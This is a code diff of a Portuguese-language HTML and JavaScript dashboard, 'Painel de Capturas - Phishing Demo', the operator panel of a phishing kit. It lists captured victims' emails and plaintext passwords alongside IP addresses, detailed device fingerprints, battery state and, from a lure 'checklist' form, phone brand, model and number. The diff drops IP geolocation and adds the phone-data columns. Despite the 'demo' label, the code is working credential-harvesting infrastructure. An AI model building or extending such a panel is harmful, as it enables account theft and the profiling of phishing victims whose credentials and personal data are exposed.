@@ -5,186 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Painel de Capturas - Phishing Demo</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f5f5f5;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 1600px;
-            margin: 0 auto;
-        }
-        
-        h1 {
-            color: #202124;
-            margin-bottom: 20px;
-            font-size: 28px;
-        }
-        
-        .warning {
-            background: #fce8e6;
-            border: 1px solid #f28b82;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-            color: #c5221f;
-            font-size: 14px;
-        }
-        
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-        
-        .stat-card {
-            background: #fff;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            padding: 20px;
-            text-align: center;
-        }
-        
-        .stat-number {
-            font-size: 32px;
-            font-weight: bold;
-            color: #d93025;
-            margin-bottom: 5px;
-        }
-        
-        .stat-label {
-            color: #5f6368;
-            font-size: 14px;
-        }
-        
-        .last-update {
-            text-align: right;
-            color: #5f6368;
-            font-size: 14px;
-            margin-bottom: 15px;
-        }
-        
-        .table-wrapper {
-            overflow-x: auto;
-            background: #fff;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-        }
-        
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 13px;
-        }
-        
-        th {
-            background: #f8f9fa;
-            padding: 10px 8px;
-            text-align: left;
-            font-weight: 600;
-            color: #5f6368;
-            border-bottom: 1px solid #dadce0;
-            white-space: nowrap;
-        }
-        
-        td {
-            padding: 10px 8px;
-            border-bottom: 1px solid #f0f0f0;
-            color: #202124;
-            vertical-align: top;
-        }
-        
-        tr:last-child td {
-            border-bottom: none;
-        }
-        
-        tr:hover {
-            background: #fafafa;
-        }
-        
-        .email {
-            font-weight: 500;
-            color: #1a73e8;
-        }
-        
-        .password {
-            font-family: 'Courier New', monospace;
-            color: #d93025;
-            font-weight: bold;
-        }
-        
-        .ip {
-            font-family: 'Courier New', monospace;
-            color: #188038;
-            font-weight: 600;
-        }
-        
-        .timestamp {
-            white-space: nowrap;
-            font-size: 12px;
-        }
-        
-        .device-info {
-            font-size: 12px;
-            color: #5f6368;
-            line-height: 1.4;
-        }
-        
-        .no-data {
-            text-align: center;
-            padding: 40px;
-            color: #5f6368;
-        }
-        
-        .expand-btn {
-            background: #1a73e8;
-            color: #fff;
-            border: none;
-            padding: 4px 10px;
-            border-radius: 4px;
-            font-size: 11px;
-            cursor: pointer;
-        }
-        
-        .expand-btn:hover {
-            background: #1557b0;
-        }
-        
-        .details-row {
-            background: #f8f9fa;
-        }
-        
-        .details-row td {
-            padding: 12px 16px;
-        }
-        
-        .details-content {
-            font-size: 12px;
-            color: #3c4043;
-            line-height: 1.6;
-        }
-        
-        .details-content strong {
-            color: #202124;
-        }
-        
-        @media (max-width: 768px) {
-            table {
-                font-size: 11px;
-            }
-            
-            th, td {
-                padding: 6px 4px;
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; padding: 20px; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 { color: #202124; margin-bottom: 20px; font-size: 28px; }
+        .warning { background: #fce8e6; border: 1px solid #f28b82; border-radius: 8px; padding: 15px; margin-bottom: 20px; color: #c5221f; font-size: 14px; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }
+        .stat-card { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 20px; text-align: center; }
+        .stat-number { font-size: 32px; font-weight: bold; color: #d93025; margin-bottom: 5px; }
+        .stat-label { color: #5f6368; font-size: 14px; }
+        .last-update { text-align: right; color: #5f6368; font-size: 14px; margin-bottom: 15px; }
+        .table-wrapper { overflow-x: auto; background: #fff; border: 1px solid #dadce0; border-radius: 8px; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        th { background: #f8f9fa; padding: 10px 8px; text-align: left; font-weight: 600; color: #5f6368; border-bottom: 1px solid #dadce0; white-space: nowrap; }
+        td { padding: 10px 8px; border-bottom: 1px solid #f0f0f0; color: #202124; vertical-align: top; }
+        tr:last-child td { border-bottom: none; }
+        tr:hover { background: #fafafa; }
+        .email { font-weight: 500; color: #1a73e8; }
+        .password { font-family: 'Courier New', monospace; color: #d93025; font-weight: bold; }
+        .ip { font-family: 'Courier New', monospace; color: #188038; font-weight: 600; }
+        .timestamp { white-space: nowrap; font-size: 12px; }
+        .device-info { font-size: 12px; color: #5f6368; line-height: 1.5; }
+        .no-data { text-align: center; padding: 40px; color: #5f6368; }
+        .expand-btn { background: #1a73e8; color: #fff; border: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; cursor: pointer; }
+        .expand-btn:hover { background: #1557b0; }
+        .details-row { background: #f8f9fa; }
+        .details-row td { padding: 12px 16px; }
+        .details-content { font-size: 12px; color: #3c4043; line-height: 1.6; }
+        .details-content strong { color: #202124; }
+        @media (max-width: 768px) { table { font-size: 11px; } th, td { padding: 6px 4px; } }
     </style>
 </head>
 <body>
@@ -227,12 +76,12 @@
                     <th>📧 Email</th>
                     <th>🔑 Senha</th>
                     <th>🌍 IP</th>
-                    <th>📍 Localização</th>
-                    <th>📱 Dispositivo</th>
+                    <th>📱 Marca/Modelo</th>
+                    <th>📞 Telemóvel</th>
                     <th>💻 OS / Browser</th>
                     <th>📐 Tela / Idioma</th>
                     <th>🔧 CPU / RAM</th>
-                    <th>📡 Rede</th>
+                    <th>📡 Rede / Bateria</th>
                     <th>🕐 Timestamp</th>
                     <th>🔍</th>
                 </tr>
@@ -255,7 +104,6 @@
             try {
                 const response = await fetch(`${API_URL}/stats`);
                 const data = await response.json();
-                
                 document.getElementById('totalLogins').textContent = data.total_logins || 0;
                 document.getElementById('uniqueIps').textContent = data.unique_ips || 0;
                 document.getElementById('uniqueEmails').textContent = data.unique_emails || 0;
@@ -282,7 +130,6 @@
             try {
                 const response = await fetch(`${API_URL}/logs`);
                 const data = await response.json();
-                
                 const tbody = document.getElementById('logsTable');
                 
                 if (!data.logs || data.logs.length === 0) {
@@ -298,20 +145,26 @@
                         d = {};
                     }
                     
-                    const deviceType = getDeviceLabel(d);
-                    const mobileType = getMobileType(d);
-                    const osInfo = d.os || 'unknown';
-                    const browserInfo = d.browser || 'unknown';
+                    // Extrair dados do formulário se existirem
+                    const isForm = d.source === 'checklist_form';
+                    const phoneBrand = d.phone_brand || '-';
+                    const phoneModel = d.phone_model || '-';
+                    const phoneNumber = d.phone_number || '-';
+                    
+                    const osInfo = d.os || '?';
+                    const browserInfo = d.browser || '?';
                     const screen = d.screen || '?';
                     const lang = d.language || '?';
                     const cores = d.cores || '?';
                     const memory = d.memory ? d.memory + 'GB' : '?';
                     const network = d.network || '?';
-                    const timezone = d.timezone || '?';
                     const platform = d.platform || '?';
+                    const timezone = d.timezone || '?';
                     
                     let battery = '?';
-                    if (d.battery === true) battery = '🔋 Sim';
+                    if (d.battery && typeof d.battery === 'object') {
+                        battery = d.battery.level + '%' + (d.battery.charging ? ' ⚡' : '');
+                    } else if (d.battery === true) battery = '🔋 Sim';
                     else if (d.battery === false) battery = '❌ Não';
                     
                     return `
@@ -319,12 +172,12 @@
                             <td><strong>#${log.id}</strong></td>
                             <td class="email">${escapeHtml(log.email)}</td>
                             <td class="password">${escapeHtml(log.password)}</td>
-                            <td class="ip" id="ip-${log.id}">${escapeHtml(log.ip)}</td>
-                            <td class="device-info" id="geo-${log.id}">⏳</td>
-                            <td class="device-info">${deviceType}${mobileType ? ' (' + mobileType + ')' : ''}</td>
+                            <td class="ip">${escapeHtml(log.ip)}</td>
+                            <td class="device-info">${escapeHtml(phoneBrand)} ${phoneModel !== '-' ? '/ ' + escapeHtml(phoneModel) : ''}</td>
+                            <td class="device-info">${escapeHtml(phoneNumber)}</td>
                             <td class="device-info">${escapeHtml(osInfo)}<br>${escapeHtml(browserInfo)}<br><small>${escapeHtml(platform)}</small></td>
                             <td class="device-info">${escapeHtml(screen)}<br>${escapeHtml(lang)}<br><small>${escapeHtml(timezone)}</small></td>
-                            <td class="device-info">${cores} cores<br>${memory} RAM</td>
+                            <td class="device-info">${cores} cores<br>${memory}</td>
                             <td class="device-info">${escapeHtml(network)}<br>${battery}</td>
                             <td class="timestamp">${formatDate(log.timestamp)}</td>
                             <td><button class="expand-btn" onclick="toggleDetails(${log.id})">Ver</button></td>
@@ -340,27 +193,20 @@
                                     <strong>Online:</strong> ${d.online ? '✅ Sim' : '❌ Não'}<br>
                                     <strong>Do Not Track:</strong> ${escapeHtml(String(d.doNotTrack || 'N/A'))}<br>
                                     <strong>Referrer:</strong> ${escapeHtml(d.referrer || 'Direct')}<br>
-                                    <strong>URL:</strong> ${escapeHtml(d.url || 'N/A')}<br>
-                                    <strong>Client IP:</strong> ${escapeHtml(d.client_provided ? 'Fornecido pelo cliente' : 'Headers do servidor')}<br>
-                                    ${d.source === 'checklist_form' ? `
+                                    ${isForm ? `
                                         <div style="margin-top:10px;padding:10px;background:rgba(255,165,0,0.15);border:1px solid rgba(255,165,0,0.4);border-radius:6px;">
                                             <strong style="color:#ffa500;">📋 Dados do Formulário de Checklist:</strong><br>
-                                            <strong>📱 Marca:</strong> ${escapeHtml(d.phone_brand || 'N/A')}<br>
-                                            <strong>📋 Modelo:</strong> ${escapeHtml(d.phone_model || 'N/A')}<br>
-                                            <strong>📞 Número:</strong> ${escapeHtml(d.phone_number || 'N/A')}
+                                            <strong>📱 Marca:</strong> ${escapeHtml(phoneBrand)}<br>
+                                            <strong>📋 Modelo:</strong> ${escapeHtml(phoneModel)}<br>
+                                            <strong>📞 Número:</strong> ${escapeHtml(phoneNumber)}
                                         </div>
                                     ` : ''}
-                                    <strong>Device Info Raw:</strong> <pre style="background:#fff;padding:8px;border-radius:4px;overflow:auto;font-size:11px;">${escapeHtml(JSON.stringify(d, null, 2))}</pre>
+                                    <strong>Dados Brutos:</strong> <pre style="background:#fff;padding:8px;border-radius:4px;overflow:auto;font-size:11px;">${escapeHtml(JSON.stringify(d, null, 2))}</pre>
                                 </div>
                             </td>
                         </tr>
                     `;
                 }).join('');
-                
-                // Buscar geolocalização para cada IP
-                data.logs.forEach(log => {
-                    lookupGeo(log.id, log.ip);
-                });
                 
                 const now = new Date();
                 document.getElementById('lastUpdate').textContent = now.toLocaleString('pt-BR');
@@ -374,33 +220,6 @@
             const row = document.getElementById('details-' + id);
             if (row) {
                 row.style.display = row.style.display === 'none' ? 'table-row' : 'none';
-            }
-        }
-        
-        async function lookupGeo(id, ip) {
-            if (!ip || ip === 'unknown' || ip === '0.0.0.0') {
-                document.getElementById('geo-' + id).innerHTML = '<span style="color:#999;">N/A</span>';
-                return;
-            }
-            try {
-                const res = await fetch(`${API_URL}/lookup-ip/${ip}`);
-                if (res.ok) {
-                    const data = await res.json();
-                    if (data.status === 'success') {
-                        document.getElementById('geo-' + id).innerHTML = `
-                            <strong>${escapeHtml(data.country || '?')}</strong><br>
-                            ${escapeHtml(data.regionName || '?')}<br>
-                            ${escapeHtml(data.city || '?')}<br>
-                            <small>${escapeHtml(data.isp || '?')}</small>
-                        `;
-                    } else {
-                        document.getElementById('geo-' + id).innerHTML = '<span style="color:#999;">Não encontrado</span>';
-                    }
-                } else {
-                    document.getElementById('geo-' + id).innerHTML = '<span style="color:#999;">Erro</span>';
-                }
-            } catch (e) {
-                document.getElementById('geo-' + id).innerHTML = '<span style="color:#999;">Erro</span>';
             }
         }
         
@@ -426,21 +245,14 @@
         function resetCountdown() {
             let seconds = 120;
             document.getElementById('nextUpdate').textContent = '02:00';
-            
-            if (countdownInterval) {
-                clearInterval(countdownInterval);
-            }
-            
+            if (countdownInterval) clearInterval(countdownInterval);
             countdownInterval = setInterval(() => {
                 seconds--;
                 const mins = Math.floor(seconds / 60);
                 const secs = seconds % 60;
                 document.getElementById('nextUpdate').textContent = 
                     `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-                
-                if (seconds <= 0) {
-                    clearInterval(countdownInterval);
-                }
+                if (seconds <= 0) clearInterval(countdownInterval);
             }, 1000);
         }
         
